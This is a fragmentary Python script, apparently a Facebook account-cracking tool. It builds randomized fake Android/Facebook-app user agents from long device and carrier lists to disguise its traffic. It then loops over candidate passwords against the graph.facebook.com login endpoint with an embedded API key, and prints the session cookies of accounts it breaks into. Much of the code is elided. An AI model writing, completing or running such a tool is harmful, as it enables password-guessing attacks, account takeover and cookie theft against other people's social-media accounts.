...
def random_dalvik_ua_fast():
    # Fixed values
    fban, fbpn = "FB4A", "com.facebook.katana"
    ...
    fbmf, models = random.choice(devices)
    fbdv = random.choice(models)

    # Random system info
    fbsv = f"{random.randint(9,14)}.{random.randint(0,5)}.{random.randint(1,5)}"
    build = random.choice([
        "TP1A.220624.014","SP1A.210812.016","UP1A.231005.007","TQ3A.230901.001",
        "RQ3A.210705.001","QP1A.190711.020","RKQ1.200710.003","SP2A.220305.012"
    ])
    density = random.choice(['1.0','1.5','2.0','2.5','3.0'])
    width, height = random.choice(["720","1080","1440"]), random.choice(["1280","1920","2400"])
    ...
    END = (
        ...
        f"FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbmf};FBPN/{fbpn};"
        f"FBDV/{fbdv};FBSV/{fbsv};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    )

    # Final UA
    return f"Dalvik/2.1.0 (Linux; U; Android {fbsv}; {fbdv} Build/{build}) {END}"


# Example run
for _ in range(3):
    print(random_dalvik_ua_fast())
#─━─━─━─━[User Agent]━─━─━─━─━#
# M2
def yousuffile():
...
def random_dalvik_ua_all():
    fban = "FB4A"
    facebook_version = f"{random.randint(350, 450)}.0.0.{random.randint(1, 40)}.{random.randint(50, 180)}"
    fbbv = str(random.randint(10000000, 77777777))
    density = random.choice(['1.0','1.5','2.0','2.5','3.0'])
    width = random.choice(["720","1080","1440"])
    height = random.choice(["1280","1920","2400","2560"])
    fbcr = random.choice(['Grameenphone','Robi','Banglalink','Airtel','Teletalk'])
    fblc = random.choice(["en_US","bn_BD"])
    fbpn = "com.facebook.katana"

    # 🔥 All Popular Devices (BD + Global 2024/25)
    devices = [
        # Xiaomi
        ("Xiaomi", "Redmi Note 13"), ("Xiaomi", "Redmi Note 12"), ("Xiaomi", "Redmi Note 11 Pro"),
        ("Xiaomi", "Poco X6 Pro"), ("Xiaomi", "Poco F5"), ("Xiaomi", "Xiaomi 13T Pro"),

        # Samsung
        ("Samsung", "Galaxy A15"), ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A54"),
        ("Samsung", "Galaxy S22 Ultra"), ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy M33"),
        ("Samsung", "Galaxy Z Fold5"),

        # Realme
        ("Realme", "Realme C55"), ("Realme", "Realme Narzo 60"), ("Realme", "Realme 11 Pro+"),
        ("Realme", "Realme GT Neo 5"), ("Realme", "Realme 12 Pro"),

        # Oppo
        ("Oppo", "Oppo A78"), ("Oppo", "Oppo F23"), ("Oppo", "Oppo Reno 10"),
        ("Oppo", "Oppo F21 Pro"), ("Oppo", "Oppo Find X6"),

        # Vivo
        ("Vivo", "Vivo Y36"), ("Vivo", "Vivo V27"), ("Vivo", "Vivo Y02"),
        ("Vivo", "Vivo X80"), ("Vivo", "Vivo V29e"),

        # Infinix
        ("Infinix", "Infinix Note 30"), ("Infinix", "Infinix Zero 30"),
        ("Infinix", "Infinix Hot 40i"), ("Infinix", "Infinix GT 10 Pro"),

        # Tecno
        ("Tecno", "Tecno Spark 20"), ("Tecno", "Tecno Camon 20"),
        ("Tecno", "Tecno Pova 5"), ("Tecno", "Tecno Phantom X2"),
        ("Tecno", "Tecno Pop 8"),

        # OnePlus
        ("OnePlus", "OnePlus 11"), ("OnePlus", "OnePlus 12R"),
        ("OnePlus", "OnePlus Nord 3"), ("OnePlus", "OnePlus 10 Pro"),

        # Google
        ("Google", "Pixel 6a"), ("Google", "Pixel 7"), ("Google", "Pixel 7 Pro"),
        ("Google", "Pixel 8"), ("Google", "Pixel 8a"),

        # Symphony
        ("Symphony", "Symphony Z60"), ("Symphony", "Symphony Z55"),
        ("Symphony", "Symphony i99"), ("Symphony", "Symphony Z45"),

        # Walton
        ("Walton", "Walton Primo H10"), ("Walton", "Walton Primo RX9"),
        ("Walton", "Walton Primo NF5"), ("Walton", "Walton Primo HM6"),

        # Itel
        ("Itel", "Itel A70"), ("Itel", "Itel S23"),
        ("Itel", "Itel Vision 3"), ("Itel", "Itel Vision 2 Plus"),
    ]
    ...
    fbsv = str(random.randint(10, 14))

    # ✅ Realistic Build Tags
    build = random.choice([
        "UP1A.231005.007","UP1A.240205.002","TQ3A.230901.001",
        "TP1A.220624.014","SP1A.210812.016","RQ3A.210705.001",
        "QP1A.190711.020","RKQ1.200710.003"
    ])
...
def random_dalvik_ua():
    ...
    # ✅ Popular Devices (BD + Global 2024/25)
    devices = [
        # Xiaomi
        ("Xiaomi", "Redmi Note 13"), ("Xiaomi", "Redmi Note 12"), ("Xiaomi", "Redmi Note 11 Pro"),
        ("Xiaomi", "Poco X6 Pro"), ("Xiaomi", "Poco F5"), ("Xiaomi", "Xiaomi 13T Pro"),
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 5.7
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print('\r\r\033[1;91m [🌸] [COOKIE] = \033[1;36m'+coki)
                    oks.append(sid)
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
